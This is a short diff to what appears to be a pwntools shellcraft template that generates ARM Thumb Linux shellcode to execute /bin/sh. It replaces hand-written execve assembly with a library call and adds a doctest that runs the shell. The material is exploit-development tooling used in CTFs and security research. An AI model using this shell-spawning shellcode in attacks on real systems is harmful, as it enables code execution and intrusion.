@@ -1,12 +1,11 @@
-<% from pwnlib.shellcraft.thumb import mov %>
-<%docstring>Execute /bin/sh</%docstring>
+<% from pwnlib.shellcraft import thumb %>
+<%docstring>
+Execute a different process.
 
-  adr r0, execve_addr
-  ${mov('r2', 0)}
-  ${mov('r7', 'SYS_execve')}
-  push {r0, r2}
-  mov r1, sp
-  svc 1
-  .balign 4, 1
-execve_addr:
-  .ascii "/bin/sh"
+    >>> p = run_assembly(shellcraft.thumb.linux.sh())
+    >>> p.sendline('echo Hello')
+    >>> p.recv()
+    'Hello\n'
+
+</%docstring>
+${thumb.linux.execve('/bin///sh', 0, 0)}
